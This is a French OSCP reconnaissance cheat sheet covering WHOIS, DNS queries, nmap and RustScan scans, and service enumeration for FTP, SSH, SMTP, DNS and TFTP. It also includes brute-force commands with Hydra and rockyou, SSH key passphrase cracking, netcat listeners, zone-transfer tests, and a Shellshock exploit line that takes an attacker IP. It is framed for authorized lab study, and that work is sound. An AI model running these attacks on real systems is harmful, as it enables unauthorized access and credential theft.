---
title: "OSCP · Reconnaissance"
description: "Identifier les hôtes, les ports et les services accessibles."
---

# OSCP · Reconnaissance

Identifier les hôtes, les ports et les services accessibles.

## Enregistrement d’un domaine

### Interroger le service WHOIS du registre

Sous Linux avec le client `whois`, cette commande demande la fiche publique d’un domaine français.

```bash
whois afnic.fr
```

### Choisir explicitement le serveur WHOIS

```bash
whois -h whois.nic.fr afnic.fr
```

[Client WHOIS Debian](https://manpages.debian.org/trixie/whois/whois.1.en.html) · [Registre du .fr](https://www.iana.org/domains/root/db/fr.html).

**Paramètres et repères :**
`site:somesite.com` · `site:somesite.com -filetype:html` · `filetype:txt` · `ext:txt`  
`intitle:"exemple"`  

## Énumération DNS

Interroger les enregistrements DNS et identifier les services associés.

<p class="oscp-command-note">DNS : résoudre des noms et interroger les enregistrements TXT avec host et nslookup.</p>

```bash
# Résoudre les adresses associées au domaine
host example.com

# Lire les enregistrements TXT du domaine
host -t TXT example.com

# Résoudre un sous-domaine précis
host www.example.com

# Interroger les enregistrements TXT via un résolveur DNS précis
nslookup -type=TXT example.com 192.0.2.53

# Résoudre chaque préfixe de sous-domaine du fichier (une entrée par ligne, sans suffixe .example.com)
while IFS= read -r sous_domaine; do [ -n "$sous_domaine" ] && host "${sous_domaine}.example.com"; done < sous_domaines.txt

```

## Scanner les ports

Vérifier les ports et les services de la cible autorisée.

### Netcat

<p class="oscp-command-note">Netcat : tester un port TCP, envoyer des datagrammes UDP ou ouvrir une écoute locale selon la commande.</p>

```bash
nc -nv 192.0.2.10 80

# Envoyer des datagrammes UDP (aucune réponse ne garantit pas que le port est fermé)
nc -u -nv 192.0.2.10 53

# Netcat : écouter une connexion TCP entrante sur le port local 4444
nc -l 4444

# Netcat : rester à l'écoute après déconnexion ; -k dépend de la variante installée
nc -k -l 4444

# Netcat : tester les ports TCP 1 à 1024 ; -w 1 limite l'attente par connexion
nc -nvv -w 1 -z 192.0.2.10 1-1024

# Netcat : sonder UDP 53 à 55 sans données applicatives ; l'état des ports reste incertain
nc -nvu -z -w 1 192.0.2.10 53-55

# Netcat : sonder UDP 53 ; l'absence de réponse ne prouve ni ouverture ni fermeture
nc -nvzu -w 2 192.0.2.10 53

# Netcat : écouter sur TCP 4444 ; cette commande n'ouvre aucun shell à elle seule
nc -nvlp 4444

```

### Nmap

Vérifier les ports et les services de la cible autorisée.

#### Séquence de scans Nmap pour un premier diagnostic

**Énumération avancée**

<p class="oscp-command-note">Nmap -A : activer détection OS, versions, scripts par défaut et traceroute ; enregistrer la sortie.</p>

```bash
sudo nmap -A <IP_CIBLE> -oN rapport_avance.txt

```

**Scan SYN de tous les ports TCP (débit minimal demandé, risque de pertes)**

```bash
sudo nmap -sS -p- --min-rate 1000 --max-retries 1 -T4 <IP_CIBLE>

```

**Scan de tous les ports TCP sans découverte d'hôte préalable (-Pn)**

<p class="oscp-command-note">Nmap : scanner les 65 535 ports TCP sans résolution DNS ni découverte d'hôte.</p>

```bash
nmap -p- -T4 -n -Pn <IP_CIBLE> -oN rapport_ports.txt

```

**Scan SYN à débit élevé sur tous les ports TCP (résultats à confirmer)**

<p class="oscp-command-note">Nmap : scan SYN rapide de tous les ports TCP ; --min-rate 5000 peut dégrader la fiabilité.</p>

```bash
sudo nmap -sS --min-rate 5000 -p- -vvv -Pn -n -oG openPorts.txt <IP_CIBLE>

```

**Scan des 65 535 ports TCP avec les réglages Nmap par défaut**

<p class="oscp-command-note">Nmap : scanner tous les ports TCP avec la cadence par défaut et enregistrer les résultats.</p>

```bash
nmap -p- <IP_CIBLE> -oN rapport_ports.txt

```

**Scanner les 100 ports TCP les plus fréquents**

<p class="oscp-command-note">Nmap : scanner les 100 ports les plus fréquents selon la base nmap-services.</p>

```bash
nmap --top-ports 100 192.0.2.10

```

#### Types de scan

Vérifier les ports et les services de la cible autorisée.

**Paramètres et repères :**
`-sU` (scan UDP)  

**Scan combiné TCP SYN et UDP (`-sS -sU`)**

<p class="oscp-command-note">Nmap : combiner SYN TCP et UDP sur les ports par défaut ; sudo permet l'envoi de paquets bruts.</p>

```bash
sudo nmap -sU -sS <IP_CIBLE>

```

```bash
# Examiner les ports UDP
sudo nmap -sU --top-ports 500 -T3 <IP_CIBLE>

```

**Paramètres et repères :**
`-sT` (TCP connect)  

**Connexion TCP complète (TCP Connect, -sT)**

```bash
nmap -sT <IP_CIBLE>

```

**Paramètres et repères :**
`-sS` (SYN)  

**Scan TCP SYN (`-sS`, nécessite des privilèges de paquets bruts)**

```bash
sudo nmap -sS <IP_CIBLE>

```

**Scan d’un port précis**

```bash
nmap -p 445 192.0.2.10

```

**Paramètres et repères :**
`-sn` (découverte d'hôtes)  

**Découverte d'hôtes sans scan de ports (`-sn`)**

<p class="oscp-command-note">Nmap -sn : rechercher les hôtes répondant aux sondes de découverte, sans scanner leurs ports.</p>

```bash
nmap -sn 192.0.2.0/24

```

**Scanner les 20 ports TCP les plus fréquents**

<p class="oscp-command-note">Nmap : scanner les 20 ports les plus fréquents selon la base nmap-services.</p>

```bash
nmap --top-ports 20 <IP_CIBLE>

```

**Paramètres et repères :**
`/usr/share/nmap/nmap-services`  

#### Identifier le système d’exploitation et les services

Vérifier les ports et les services de la cible autorisée.

**Paramètres et repères :**
`-O` (détection du système)  

**Détection du système d'exploitation (`-O`)**

<p class="oscp-command-note">Nmap -O : tenter d'identifier le système d'exploitation par empreinte réseau.</p>

```bash
sudo nmap -O <IP_CIBLE>

```

**Détection OS avec hypothèses moins certaines (`--osscan-guess`)**

```bash
sudo nmap -O --osscan-guess <IP_CIBLE>

```

**Paramètres et repères :**
`-sV` (versions de service)  

**Identifier les versions des services (`-sV`)**

<p class="oscp-command-note">Nmap -sV : interroger les services détectés pour estimer leur produit et leur version.</p>

```bash
nmap -sV 192.0.2.10

```

**Détection avancée des services, de l'OS et du chemin réseau (`-A`)**

<p class="oscp-command-note">Nmap -A : regrouper détection d'OS, versions, scripts NSE et traceroute.</p>

```bash
sudo nmap -A <IP_CIBLE>

```

**Paramètres et repères :**
`-sV` (versions de service)  

#### Enregistrer et exploiter les résultats Nmap

Conserver les résultats de découverte puis extraire les adresses des hôtes détectés.

**Paramètres et repères :**
`-oG` (sortie grepable)  

**Découverte d'hôtes avec sortie grepable (-oG)**

<p class="oscp-command-note">Nmap -sn : détecter les hôtes répondants et enregistrer les résultats au format grepable (.gnmap).</p>

```bash
nmap -v -sn <RESEAU_CIDR> -oG decouverte.gnmap

```

**Paramètres et repères :**
`-oN` (sortie texte)  

**Extraire les adresses IP des lignes « Status: Up » du fichier `.gnmap`**

<p class="oscp-command-note">AWK : extraire la deuxième colonne des lignes Host marquées Up dans la sortie grepable Nmap.</p>

```bash
awk '/^Host: / && /Status: Up/{print $2}' decouverte.gnmap

```

#### Scripts Nmap (NSE)

Vérifier les ports et les services de la cible autorisée.

**Paramètres et repères :**
`/usr/share/nmap/scripts/`  

**Paramètres et repères :**
`--script`  

**Exécuter un script NSE (--script)**

<p class="oscp-command-note">Nmap NSE : remplacer SCRIPT_NSE par le nom d'un script installé et lire son aide avant exécution.</p>

```bash
nmap --script <SCRIPT_NSE> <IP_CIBLE>

```

**Afficher l’aide des scripts NSE**

<p class="oscp-command-note">Nmap NSE : afficher la documentation et les arguments du script smb-os-discovery.</p>

```bash
nmap --script-help smb-os-discovery

```

**Lire les en-têtes HTTP avec le script NSE `http-headers`**

<p class="oscp-command-note">Nmap HTTP : lire les en-têtes HTTP sur TCP 80 avec le script http-headers.</p>

```bash
nmap -p 80 --script http-headers 192.0.2.10

```

**Exécuter les scripts NSE par défaut (catégorie `default`) sur les ports détectés**

```bash
nmap --script default 192.0.2.10

```

**Catégories NSE :**
`auth` (authentification) · `broadcast` (diffusion) · `brute` (essais de mots de passe) · `default` (scripts par défaut)  
`discovery` (découverte) · `exploit` (tests d'exploitation) · `fuzzer` (fuzzing) · `malware` (malwares)  
`safe` (non intrusifs selon NSE) · `version` (versions) · `vuln` (vulnérabilités)  

#### Fonctions PowerShell

Observer les permissions et la configuration de Windows.

**Vérifier un port TCP**

<p class="oscp-command-note">PowerShell : vérifier la connexion TCP vers le port 445 avec Test-NetConnection.</p>

```powershell
Test-NetConnection -ComputerName 192.0.2.10 -Port 445

```

**Exemple de scan TCP en PowerShell**

```powershell
1..1024 | ForEach-Object { $port = $_; $client = [Net.Sockets.TcpClient]::new(); try { if ($client.ConnectAsync('192.0.2.10', $port).Wait(150)) { "TCP $port ouvert" } } catch {} finally { $client.Dispose() } }

```

#### Inventaire TCP complet

Découvrir les ports TCP puis identifier les services dans le périmètre autorisé.

<p class="oscp-command-note">Nmap : scanner tous les ports TCP, puis identifier les services sur les ports ouverts relevés.</p>

```bash
sudo nmap -sS -p- -Pn -n -oN rapport_ports.txt <IP_CIBLE>
nmap -sV -sC -p <LISTE_PORTS> -oN rapport_services.txt <IP_CIBLE>
```

#### Contrôle des scripts NSE

Afficher la documentation d'un script puis consulter son comportement avant de l'exécuter.

<p class="oscp-command-note">Nmap NSE : lire l'aide d'un script, puis l'exécuter sur le port choisi après validation du périmètre.</p>

```bash
nmap --script-help <SCRIPT_NSE>
nmap -sV -p <PORT> --script <SCRIPT_NSE> <IP_CIBLE>
```

#### Découverte de plusieurs hôtes

Effectuer un ping sweep sans lancer de scan de ports. Les pare-feu peuvent masquer des hôtes présents.

<p class="oscp-command-note">Nmap -sn -n : découvrir les hôtes d'un réseau sans scan de ports ni résolution DNS.</p>

```bash
nmap -sn -n 192.0.2.0/24
```

### RustScan

Vérifier les ports et les services de la cible autorisée.

**Rechercher les ports TCP ouverts avec RustScan**

<p class="oscp-command-note">RustScan : rechercher les ports TCP ouverts sur la plage 1 à 65535.</p>

```bash
rustscan -a <IP_CIBLE> -p 1-65535

```

**Transmettre les options à Nmap après `--`**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -- -Pn

```

**Limiter RustScan aux ports 1 à 1000**

```bash
rustscan -a 192.0.2.10 -r 1-1000

```

**Régler la taille des lots (`-b`) et le délai (`-u`, en millisecondes)**

```bash
rustscan -a 192.0.2.10 -b 500 -u 5000

```

**Scanner uniquement les ports TCP 22, 80 et 443**

```bash
rustscan -a <IP_CIBLE> -p 22,80,443

```

**Enregistrer la sortie Nmap lancée par RustScan dans un fichier texte**

```bash
rustscan -a <IP_CIBLE> -- -oN rapport_rustscan.txt

```

**Scan UDP avec Nmap (RustScan découvre principalement les ports TCP)**

```bash
sudo nmap -sU --top-ports 100 <IP_CIBLE>

```

**Lancer les scripts NSE de catégorie `vuln` après la découverte TCP (potentiellement intrusif)**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -- -sV --script vuln

```

**Afficher une sortie RustScan réduite (vérifier les options de la version installée)**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -g -q

```

**Exclure les ports TCP 80 et 443 du scan RustScan**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 --exclude-ports 80,443

```

**Demander la détection de l'OS par Nmap (privilèges adaptés requis)**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -- -O

```

**Nmap : scan SYN et UDP après découverte RustScan (privilèges requis ; UDP plus lent)**

```bash
rustscan -a <IP_CIBLE> -p 1-65535 -- -sS -sU

```

### Découverte d'hôtes avec fping

Vérifier les hôtes répondant à ICMP dans un sous-réseau de laboratoire, sans considérer les non-répondants comme absents.

<p class="oscp-command-note">fping : afficher les hôtes répondant à ICMP dans le réseau indiqué ; les autres peuvent être filtrés.</p>

```bash
fping -a -g <RESEAU_CIDR> 2>/dev/null
```

## Services par port

Vérifier les ports et les services de la cible autorisée.

### 21: FTP

Transférer ou récupérer des fichiers dans le laboratoire.

<p class="oscp-command-note">Nmap FTP : vérifier l'accès anonyme, le rebond FTP et les informations système avec ftp-anon, ftp-bounce et ftp-syst.</p>

```bash
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst <IP_CIBLE>

```

<p class="oscp-command-note">FTP : ouvrir le client puis saisir anonymous à l'invite du nom d'utilisateur si l'accès anonyme est autorisé.</p>

```bash
ftp 192.0.2.10
# À l'invite « Name », saisir anonymous ; à l'invite du mot de passe, saisir une adresse électronique de test.
# Après connexion, « ls » liste les fichiers distants ; « get fichier.txt » télécharge un fichier autorisé.

```

```bash
# À saisir dans l'invite interactive FTP (sans recopier le préfixe ftp>) :
binary
put fichier.bin

```

<p class="oscp-command-note">Télécharger un répertoire FTP avec wget, puis rechercher des fichiers locaux avec find (deux opérations distinctes).</p>

```bash
wget -r 'ftp://192.0.2.10/repertoire/'

# Recherche locale d'un fichier précis (ne parcourt pas le serveur FTP)
find / -name 'nom_fichier' 2>/dev/null

# Recherche locale de fichiers nommés Settings.*
find / -name 'Settings.*' 2>/dev/null

```

<p class="oscp-command-note">Hydra FTP : tester un compte et un dictionnaire autorisés ; limiter les tentatives pour éviter les verrouillages.</p>

```bash
hydra -l <UTILISATEUR> -P liste_mots_de_passe.txt -t 4 ftp://<IP_CIBLE>

```

<p class="oscp-command-note">FTP : se connecter au serveur en mode passif (-p) si le client FTP utilisé prend cette option en charge.</p>

```bash
ftp -p 192.0.2.10

```

#### Accès FTP anonyme

Vérifier si le serveur autorise une connexion anonyme, sans modifier les fichiers distants.

<p class="oscp-command-note">FTP anonyme : tester la connexion et lister les fichiers sans modifier le serveur.</p>

```bash
curl -v 'ftp://anonymous:anonymous@<IP_CIBLE>/'
curl --list-only 'ftp://anonymous:anonymous@<IP_CIBLE>/'
```

### 22: SSH

<p class="oscp-command-note">Nmap SSH : examiner clés, algorithmes et authentification ; les tests brute-force sont distincts et intrusifs.</p>

```bash
# Relever les empreintes des clés d'hôte SSH annoncées par le serveur
nmap -p 22 --script ssh-hostkey <target_ip>

# Lister les méthodes d'authentification SSH ; peut provoquer des traces d'authentification
nmap -p 22 --script ssh-auth-methods <target_ip>

# Test de mots de passe SSH : risque de verrouillage ; ne lancer qu'avec autorisation
nmap -p 22 --script=ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt <target_ip>

# Lister les algorithmes SSH2 proposés ; ne suffit pas à déterminer la version du logiciel
nmap -p 22 --script ssh2-enum-algos <IP_CIBLE>

# Relever les algorithmes SSH2 et vérifier si SSHv1 est accepté
nmap -p 22 --script ssh2-enum-algos,sshv1 <IP_CIBLE>

# Vérifier l'acceptation d'une clé publique SSH de test avec le compte autorisé
nmap -p 22 --script=ssh-publickey-acceptance --script-args ssh.user=<username>,ssh.privatekey=<path_to_private_key> <target_ip>

```

<p class="oscp-command-note">Hydra SSH : tester des identifiants de laboratoire ; attention aux limitations et verrouillages de comptes.</p>

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target_ip> -t 4 ssh

hydra -L <user_list> -p <password> <target_ip> -t 4 ssh -s <port>

hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 22 [IP] ssh

```

<p class="oscp-command-note">Restreindre les permissions de la clé privée à son propriétaire, puis l'utiliser pour SSH.</p>

```bash
chmod 600 cle_privee
ssh -i cle_privee <UTILISATEUR>@<IP_CIBLE>

```

```bash
puttygen cle_putty.ppk -O private-openssh -o cle_privee

```

<p class="oscp-command-note">John : extraire le hash d'une clé privée SSH chiffrée, puis tester sa phrase secrète en laboratoire.</p>

```bash
ssh2john cle_privee > cle_privee.hash

john --wordlist=/usr/share/wordlists/rockyou.txt cle_privee.hash

```

<p class="oscp-command-note">Rechercher les clés publiques système et les fichiers de clés du compte courant (les résultats peuvent contenir des clés privées).</p>

```bash
find /etc/ssh -type f -name '*.pub' 2>/dev/null

find "$HOME/.ssh" -type f -name 'id_*' 2>/dev/null

```

<p class="oscp-command-note">SSH : distinguer extraction de hash d'une clé chiffrée et essai d'authentification avec cette clé.</p>

```bash
# Extraire le hash d'une clé privée chiffrée (inutile si elle n'a pas de phrase secrète)
ssh2john cle_privee > cle_privee.hash

# Tester une authentification SSH par clé (un refus peut avoir plusieurs causes)
ssh <user>@<target_ip> -p <port> -i <private_key_file> # Error message: Permission denied (publickey,password).

```

<p class="oscp-command-note">SCP : copier des fichiers depuis une machine distante vers Kali, avec les droits de lecture requis.</p>

```bash
# Récupérer un fichier distant vers la machine locale
scp user@remote_host:/path/to/remote/file /path/to/local/destination
scp user@192.168.1.10:/etc/config.txt /home/user/config.txt

# Récupérer plusieurs fichiers d'un même hôte distant vers un répertoire local existant
scp user@remote_host:/path/to/remote/file1 user@remote_host:/path/to/remote/file2 /local/destination/
scp user@192.168.1.10:/etc/config.txt user@192.168.1.10:/etc/passwd /home/user/

# Récupérer récursivement un répertoire distant
scp -r user@remote_host:/path/to/remote/directory /local/destination/
scp -r user@192.168.1.10:/var/www/html /home/user/

# Récupérer un fichier via un port SSH non standard : -P majuscule pour scp
scp -P 2222 user@remote_host:/path/to/remote/file /local/destination/
scp -P 2222 user@192.168.1.10:/etc/config.txt /home/user/

# Récupérer un fichier distant avec une clé privée SSH lisible uniquement par son propriétaire
scp -i /path/to/private_key user@remote_host:/path/to/remote/file /local/destination/
scp -i ~/.ssh/id_rsa user@192.168.1.10:/etc/config.txt /home/user/

# Afficher les détails du transfert distant vers local avec -v
scp -v user@remote_host:/path/to/remote/file /local/destination/
scp -v user@192.168.1.10:/etc/config.txt /home/user/

# Désactiver la vérification de clé d'hôte (dangereux : risque d'interception ; préférer accept-new et vérifier l'empreinte)
scp -o StrictHostKeyChecking=no user@remote_host:/path/to/remote/file /local/destination/
scp -o StrictHostKeyChecking=no user@192.168.1.10:/etc/config.txt /home/user/

```

```bash
# Envoyer un fichier local vers la machine distante
scp /path/to/local/file user@remote_host:/path/to/remote/destination
scp /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Envoyer plusieurs fichiers locaux vers la machine distante
scp /path/to/local/file1 /path/to/local/file2 user@remote_host:/remote/destination/
scp /home/user/config.txt /home/user/passwd user@192.168.1.10:/etc/

# Envoyer un répertoire local vers la machine distante
scp -r /path/to/local/directory user@remote_host:/path/to/remote/destination/
scp -r /home/user/html user@192.168.1.10:/var/www/

# Envoyer un fichier via un port SSH non standard : -P majuscule pour scp
scp -P 2222 /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -P 2222 /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Envoyer un fichier local en s'authentifiant avec une clé privée SSH
scp -i /path/to/private_key /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -i ~/.ssh/id_rsa /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Afficher les détails du transfert local vers distant avec -v
scp -v /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -v /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Envoyer un fichier sans vérifier la clé d'hôte (dangereux : risque d'interception ; préférer accept-new)
scp -o StrictHostKeyChecking=no /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -o StrictHostKeyChecking=no /home/user/config.txt user@192.168.1.10:/etc/config.txt

```

**Sécurité SSH :** `accept-new` accepte automatiquement une nouvelle empreinte, mais refuse une empreinte modifiée. Vérifier l'empreinte par un canal fiable avant toute première connexion sensible.  

<p class="oscp-command-note">SSH : accepter automatiquement une nouvelle clé d'hôte, mais refuser une clé déjà connue qui a changé.</p>

```bash
ssh -o StrictHostKeyChecking=accept-new <UTILISATEUR>@<IP_CIBLE>

```

**Paramètres et repères :**
`aes128-cbc`  

```bash
# Algorithme CBC ancien : peut être refusé par les configurations modernes.
ssh -c aes128-cbc utilisateur@192.0.2.10

```

**Compatibilité SSH :** le protocole SSH version 2 est utilisé par défaut sur les clients OpenSSH modernes. L'option `-1` (SSH version 1) n'est plus prise en charge par les versions récentes.  

```bash
# Ouvrir une session SSH
ssh user@target_ip

```

**Paramètres et repères :**
`diffie-hellman-group1-sha1` (échange de clés SSH ancien) · `ssh-rsa` (clé SSH RSA ancienne)  

<p class="oscp-command-note">Tester la compatibilité avec d'anciens algorithmes SSH ; cela n'implique pas d'exécuter un shell distant.</p>

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa utilisateur@192.0.2.10

# En cas d'échec, consulter le détail avec : ssh -vvv utilisateur@192.0.2.10

```

<p class="oscp-command-note">SSH : exécuter whoami sur la machine distante avec un compte autorisé, sans session interactive.</p>

```bash
ssh utilisateur@192.0.2.10 'whoami'

```

<p class="oscp-command-note">Script de commande forcée SSH : ne pas exécuter directement une chaîne non fiable.</p>

```bash
#!/bin/bash
case "$SSH_ORIGINAL_COMMAND" in
  "") echo 'Aucune commande fournie' ;;
  *) echo 'Commande non autorisée' >&2; exit 1 ;;
esac

```

<p class="oscp-command-note">Copier un script local vers un répertoire distant autorisé avec une clé SSH ; aucune écoute réseau n'est nécessaire.</p>

```bash
scp -i ~/.ssh/id_ed25519 script.sh utilisateur@192.0.2.10:/home/utilisateur/

```

<p class="oscp-command-note">SSH : ouvrir une session avec une clé privée locale ; protéger son fichier avec chmod 600.</p>

```bash
ssh -i <private_key_file> <user>@<target_ip>

```

### 23: Telnet

<p class="oscp-command-note">Se connecter au service Telnet sur TCP 23 ; protocole non chiffré, éviter d'y saisir de vrais secrets.</p>

```bash
# Connexion de base
telnet 192.0.2.10 23

# Se connecter avec un nom d'utilisateur précis
telnet -l utilisateur 192.0.2.10 23

```

### 25: SMTP

<p class="oscp-command-note">SMTP : interroger les capacités et réponses VRFY ; séparer commandes shell, saisie interactive et sortie illustrative.</p>

```bash
# Identifier les capacités SMTP et les réponses à l'énumération d'utilisateurs
nmap -sV -p 25 --script smtp-commands,smtp-enum-users 192.0.2.10

# Dialogue SMTP : ouvrir une seule connexion avec nc OU telnet, puis saisir EHLO et VRFY dans cette session
nc -nv <target_ip> 25
telnet <target_ip> 25
EHLO exemple.local
VRFY utilisateur

# Transcription illustrative de session SMTP : ne pas exécuter ces lignes dans Bash
kali@kali:~$ nc -nv 192.168.123.8 25
(UNKNOWN) [192.168.123.8] 25 (smtp) open
220 mail ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY test_user
550 5.1.1 <test_user>: Recipient address rejected: User unknown in local recipient table
^C

```

<p class="oscp-command-note">SMTP : exemples de sorties du script local vrfy.py ; ne pas copier les invites ni les réponses comme commandes.</p>

```bash
# Exemple de sortie d'un script nommé vrfy.py (fichier à créer depuis le bloc Python ci-dessous)
kali@kali:~/Desktop$ python3 vrfy.py root 192.168.123.8
b'220 mail ESMTP Postfix (Ubuntu)\r\n'
b'252 2.0.0 root\r\n'

kali@kali:~/Desktop$ python3 vrfy.py testUser 192.168.123.8
b'220 mail ESMTP Postfix (Ubuntu)\r\n'
b'550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipient table\r\n'

```

<p class="oscp-command-note">Python SMTP : envoyer VRFY pour un utilisateur puis afficher la réponse du serveur sur TCP 25.</p>

```python
import socket
import sys

if len(sys.argv) != 3:
    print("Utilisation : python3 vrfy.py <utilisateur> <ip_cible>")
    sys.exit(1)

# Créer une socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Se connecter au serveur
ip = sys.argv[2]
s.settimeout(10)
s.connect((ip, 25))

# Recevoir la bannière
banner = s.recv(1024)
print(banner)

# Envoyer une requête SMTP VRFY pour l'utilisateur indiqué
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)

# Fermer la socket
s.close()

```

<p class="oscp-command-note">Windows : activer TelnetClient avec DISM (droits administrateur requis) ; la suite illustre une session SMTP.</p>

```powershell
dism /online /Enable-Feature /FeatureName:TelnetClient

# Exemple de dialogue interactif (sortie illustrative ; ne pas coller dans PowerShell)
C:\Windows\system32>telnet 192.168.123.8 25
220 mail ESMTP Postfix (Ubuntu)
VRFY testUser
550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipient table
VRFY root
252 2.0.0 root

```

<p class="oscp-command-note">HTTP Shellshock : exemple de test NSE ciblant un CGI ; le script Python tiers cité n'est pas fourni.</p>

```bash
# Vérifier une exposition potentielle à Shellshock sur un CGI du laboratoire
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 192.0.2.10
                
# Référence historique : https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py <target_ip> <username>@<domain> <attacker_ip> 139 <root>@<domain>

# Exemple historique uniquement : script Python 2 externe ; vérifier sa provenance et ses paramètres avant utilisation

```

#### Capacités SMTP exposées

Identifier les commandes annoncées par le serveur SMTP ; les résultats d'énumération utilisateurs doivent être confirmés.

<p class="oscp-command-note">Nmap SMTP : relever les commandes annoncées et tester l'énumération d'utilisateurs sur TCP 25.</p>

```bash
nmap -sV -p 25 --script smtp-commands <IP_CIBLE>
nmap -p 25 --script smtp-enum-users <IP_CIBLE>
```

#### Énumération SMTP par VRFY

`smtp-user-enum` teste l'existence des noms contenus dans un fichier avec la commande SMTP VRFY. Ne pas interpréter un refus comme la preuve que le compte n'existe pas. Voir [la syntaxe Kali](https://www.kali.org/tools/smtp-user-enum/).

<p class="oscp-command-note">SMTP VRFY : tester les noms d'un fichier avec smtp-user-enum ; une réponse négative n'est pas concluante.</p>

```bash
smtp-user-enum -M VRFY -U <FICHIER_UTILISATEURS>.txt -t <IP_CIBLE>
```

#### Énumération SMTP par RCPT

Méthode alternative si VRFY est désactivée. Ce contrôle envoie des requêtes au serveur et doit être limité au périmètre autorisé.

<p class="oscp-command-note">SMTP RCPT : tester les destinataires d'un fichier lorsque VRFY n'est pas disponible.</p>

```bash
smtp-user-enum -M RCPT -U <FICHIER_UTILISATEURS>.txt -t <IP_CIBLE>
```

### 53: DNS

Interroger les enregistrements DNS et identifier les services associés.

<p class="oscp-command-note">Nmap DNS : exécuter dns-nsid et dns-recursion sur UDP 53 (dns-brute n'est pas lancé ici).</p>

```bash
nmap -sU -p 53 --script dns-nsid,dns-recursion <IP_CIBLE>

```

```bash
# Nmap DNS : exécuter uniquement dns-nsid sur UDP 53
nmap -sU -p 53 --script dns-nsid <IP_CIBLE>

```

<p class="oscp-command-note">DNS : tester AXFR et ANY avec dig ; ouvrir ensuite nslookup et saisir les commandes interactives séparément.</p>

```bash
dig @192.0.2.53 exemple.local AXFR  # Tester un transfert de zone autorisé
dig @192.0.2.53 exemple.local ANY  # ANY ne retourne pas nécessairement tous les enregistrements
nslookup
server 192.0.2.53
set type=any
exemple.local

```

```bash
# Tester l'énumération DNS et le transfert AXFR sur le serveur indiqué
dnsrecon -d <DOMAINE> -n <SERVEUR_DNS> -t axfr

dnsenum --enum --dnsserver <SERVEUR_DNS> <DOMAINE>

```

<p class="oscp-command-note">Nmap -sL : lister les cibles d'une plage et tenter leur résolution inverse sans envoyer de sondes de scan.</p>

```bash
nmap -sL <RESEAU_CIDR>  # Lister les cibles et tenter leur résolution DNS inverse, sans scanner les ports

```

<p class="oscp-command-note">DNS : interroger directement un serveur pour l'enregistrement A sans demander la récursion.</p>

```bash
dig @<SERVEUR_DNS> <DOMAINE> A +norecurse

```

<p class="oscp-command-note">PowerShell : résoudre un nom via le serveur DNS indiqué avec Resolve-DnsName.</p>

```powershell
Resolve-DnsName -Name <DOMAINE> -Server <SERVEUR_DNS> -DnsOnly

```

#### Enregistrements MX et TXT

Lister les serveurs de messagerie et les informations TXT d'un domaine appartenant au périmètre.

<p class="oscp-command-note">DNS : afficher uniquement les réponses MX (messagerie) et TXT d'un domaine.</p>

```bash
dig @<SERVEUR_DNS> <DOMAINE> MX +noall +answer
dig @<SERVEUR_DNS> <DOMAINE> TXT +noall +answer
```

#### Transfert de zone DNS

Vérifier si un transfert AXFR non autorisé est accepté par le serveur DNS.

<p class="oscp-command-note">DNS AXFR : vérifier si le serveur autorise un transfert complet de zone pour le domaine audité.</p>

```bash
dig @<SERVEUR_DNS> <DOMAINE> AXFR
```

### 69: TFTP

Transférer ou récupérer des fichiers dans le laboratoire.

<p class="oscp-command-note">Nmap TFTP : tester les noms de fichiers connus via tftp-enum sur UDP 69 ; pas de liste exhaustive garantie.</p>

```bash
sudo nmap -sU -p 69 --script tftp-enum <IP_CIBLE>

```

```bash
# Exécuter le script local tftp_enum.sh après l'avoir créé et rendu exécutable
./tftp_enum.sh <IP_CIBLE> <FICHIER>
./tftp_enum.sh 192.168.1.10 bootfile.bin  # Exemple sur une cible de laboratoire

```

<p class="oscp-command-note">Bash TFTP : tenter de télécharger un fichier connu ; vérifier le succès du transfert, pas seulement sa présence locale.</p>

```bash
#!/bin/bash

# Script d'énumération TFTP
if [ "$#" -ne 2 ]; then
    echo "Utilisation : $0 <ip_cible> <nom_fichier>"
    exit 1
fi

TARGET_IP=$1
FILENAME=$2

# Tenter de récupérer le fichier du serveur TFTP dans un répertoire temporaire isolé
echo "Tentative de téléchargement de $FILENAME depuis $TARGET_IP"
if [ -e "$FILENAME" ]; then
    echo "Le fichier local existe déjà : utiliser un répertoire vide pour éviter les faux positifs" >&2
    exit 1
fi
tftp "$TARGET_IP" -c get "$FILENAME"

# Vérifier le code retour du client TFTP et la présence du fichier téléchargé
if [ "$?" -eq 0 ] && [ -f "$FILENAME" ]; then
    echo "Téléchargement terminé : $FILENAME (vérifier son contenu)"
else
    echo "Transfert TFTP échoué ou fichier indisponible : $FILENAME"
fi

```

```bash
# Dans le terminal, lancer le client TFTP ; les lignes suivantes sont à saisir dans son invite :
tftp 192.0.2.10
get fichier_distant fichier_local
quit

```

```bash
# Dans le terminal, lancer le client TFTP ; les lignes suivantes sont à saisir dans son invite :
tftp 192.0.2.10
put fichier_local fichier_distant
quit

```

<p class="oscp-command-note">TFTP : essayer chaque nom de fichier de la liste sur un serveur connu ; aucun parcours distant automatique.</p>

```bash
